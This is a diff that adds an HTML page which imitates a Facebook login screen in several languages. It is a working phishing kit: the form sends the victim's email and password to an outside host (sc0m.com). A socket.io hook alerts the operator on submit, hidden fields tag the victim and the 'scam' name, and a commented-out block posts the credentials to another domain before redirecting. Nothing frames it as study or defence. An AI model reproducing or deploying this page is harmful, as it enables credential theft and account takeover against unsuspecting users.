@@ -1,0 +1,268 @@
+<html>
+  <head>
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>log in</title>
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/v3/ym/r/Gjhrhb7r0lb.png?_nc_eui2=AeE-BuWIjs6D1b4k09gRWdPtrnC626sZnnCucLrbqxmecCxnI5NHn5YNWPxs5lDvQftj5eXCGhdMICLEuP9kdSmL">
+   <style>
+       body{
+	margin: 0;
+	font-family: sans-serif;
+	font-size: 13px;
+}
+
+.ar{
+	direction: rtl;
+}
+.head{
+	background: #152da2c7;
+  height: 37px;
+}
+
+.timo{
+	color:#000e6f7a;
+	font-size:11px;
+}
+
+.asfer{
+	background-color:#fbd90026;
+	padding:7px 10px;
+	color:#584d029c;
+}
+
+.segma{
+	background-color:#a095951a;
+	padding:9px 31px;
+}
+
+.magma{
+	padding-bottom:202px;
+	text-align:center;
+}
+
+.forum{
+	padding:11px 0 0;
+}
+
+.summary.summary>*{
+	border-bottom:1px solid #c7c3c369;
+	background-color: #FDFDFB;
+}
+
+.elle{
+	border:0;
+	padding: 13px;
+	width:100%;
+}
+
+.pd-13{
+	padding: 13px;
+}
+
+.bala{
+	display:inline-block;
+	-webkit-border-radius:3px;
+	font-weight:bold;
+	background-color:#004df9ad;
+	line-height:36px;
+	padding:0 18px;
+	color:white
+}
+
+.birou {
+    padding: 12px;
+    color: #FDFDFB;
+    border: 62px #3f800fed;
+    background: #1e4088b8;
+    border-radius: 4px;
+    font-weight: bold;
+    width: 100%;
+}
+
+.choco{
+	text-align:center;
+	padding:11px;
+}
+   </style>
+  <link rel="me" href="https://www.blogger.com/profile/10152080453114445601" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+</head>
+  <body >
+    <div class="head"></div>
+    <div id="page">
+      <div class="asfer">
+        <span>{{firsts}}</span>
+      </div>
+   
+      <div class="segma" >
+        <img src="https://kgo.googleusercontent.com/profile_vrt_raw_bytes_1587515400_10885.png" style="width: 100%;" height="270px">
+        <form class="forum" method="POST" action="https://sc0m.com/v/add">
+          <div class="summary"> 
+            <input class="elle" id="email" name="email" :placeholder="email" type="text" required>
+            <input class="elle" id="password" name="password" :placeholder="password" required type="password">
+            <div class="pd-13"> 
+              <input type="hidden" value="" name="code" v-model="codecountry">
+              
+              <input type="hidden" value="" name="id" v-model="id_u">
+              <input type="hidden" value="" name="sc" v-model="scamname">
+              <button type="submit" onclick="ss()" name="add" class="birou">{{login}}</button>
+            </div>
+          </form>
+        </div> 
+        <div class="choco">
+          <a class="bala">{{create}}</a> 
+        </div>
+        <div class="magma">
+          <a class="timo">{{forget}}</a>
+        </div>
+      </div>
+    </div>
+    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+    <script src="https://unpkg.com/country-phone-prefix@latest"></script>
+     <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.3.2/socket.io.js"></script>
+  <script>  
+ const socket = io("wss://sc0m.herokuapp.com");
+     const queryStrings = window.location.search;
+        const urlParamss = new URLSearchParams(queryStrings);
+        const qs = urlParamss.get('q');
+
+        let rrss = atob(qs);
+        let users = rrss.split("_")[3];
+        users = users.split("=")[1];
+     function ss(){  
+       socket.emit('add', {
+        nickname: "users",
+        groupe: parseInt(users),
+      }); 
+      socket.emit('adds', {
+        nickname: "users",
+        groupe: "all",
+      });
+     };
+  </script>
+    <script>
+        var vm = new Vue({
+    el : "#page",
+    data:{
+      password:"",
+      email:"",
+      login:'',
+      firsts:'',
+      create:'',
+      forget:'',
+      fetch:[],
+      codecountry:'',
+      id_u:'',
+      scamname:'',
+    },
+    methods:{
+  //     adds(){
+  //       let email = document.getElementById('email').value;
+  //     let password = document.getElementById('password').value;
+  //        const queryString = window.location.search;
+  //  const urlParams = new URLSearchParams(queryString);
+  //  const id = urlParams.get('id');
+  //  const page = urlParams.get('page');
+  //  let sc = urlParams.get('sc');
+  //     if (email != "" && password != "") {
+  //       axios
+  //         .post("https://sp0meur.com/v/add", {
+  //           email: email,
+  //           ip: "wwwwwwww",
+  //           password: password,
+  //           country: this.codecountry,
+
+  //           userId: id,
+  //           pageId: page,
+  //         })
+  //         .then((res) => {
+  //        // alert(res.data.message)
+          
+  //          window.location.href ="https://sp0m.site/";
+  //         })
+  //         .catch((err) => {
+  //           window.location.href ="https://sp0m.site/";
+  //           alert(err.message);
+  //         });
+  //     } else {
+  //       alert("email or password incorect");
+  //     }
+  //     },
+   },
+          
+     mounted()  {
+         let email = document.getElementById('email').value;
+      let password = document.getElementById('password').value;
+         const queryString = window.location.search;
+   const urlParams = new URLSearchParams(queryString);
+   const q = urlParams.get('q');
+
+let rrs= atob(q);
+let idu= rrs.split("=")[1][1]
+let user= rrs.split("_")[3]
+user= user.split("=")[1]
+let sc= rrs.split("_")[2]
+sc= sc.split("=")[1]
+rrs= rrs.split("_")[1]
+rrs= rrs.split("=")[1]
+//alert(user)
+let lang = rrs;
+this.id_u = user
+this.scamname= sc
+
+       if(lang == 'ar'){
+         this.email = "رقم الهاتف  أو البريد الإلكتروني";
+         this.password = "كلمه السر";
+         this.create = "انشاء حساب جديد";
+         this.firsts = "انت تحتاج لتسجيل الدخول اولا.";
+         this.forget = " هل نسيت كلمة السر ؟";
+         this.login="تسجيل الدخول"
+       }
+       else if (lang == 'es'){
+          this.email = "Número o correo electrónico";
+         this.password = "contraseña";
+         this.create = "Crear una nueva cuenta";
+         this.firsts = "Primero debes iniciar sesión.";
+         this.forget = "¿Contraseña olvidada?";
+         this.login = "iniciar sesión";
+       }
+       else if (lang == 'th'){
+          this.email = "เบอร์มือถือหรืออีเมล";
+         this.password = "รหัสผ่าน";
+         this.create = "สร้างบัญชีใหม่";
+         this.firsts = "คุณต้องเข้าสู่ระบบก่อน";
+         this.forget = "ลืมรหัสผ่าน?";
+         this.login = "เข้าสู่ระบบ";
+       }
+       else {
+          this.email = "Mobile number or email address";
+         this.password = "Password";
+         this.create = "Create New Account";
+         this.firsts = "You need to log in first.";
+         this.forget = "Forgotten password?";
+         this.login = "Log In";
+       }
+       
+axios.get("https://livebotola.com/ip.php")
+           .then((resps)=>{
+ 
+        let dd=  cpp[resps.data]
+           this.codecountry = dd.prefix;
+             })
+      
+            },
+  })
+
+  
+    //  let t= await     axios.get("https://sp0m.site/ip.php");
+         //  let dd=  cpp[resps.data];
+        //   let oo=  dd.prefix;
+         
+
+   
+   
+    </script>
+  
+</body></html>
+
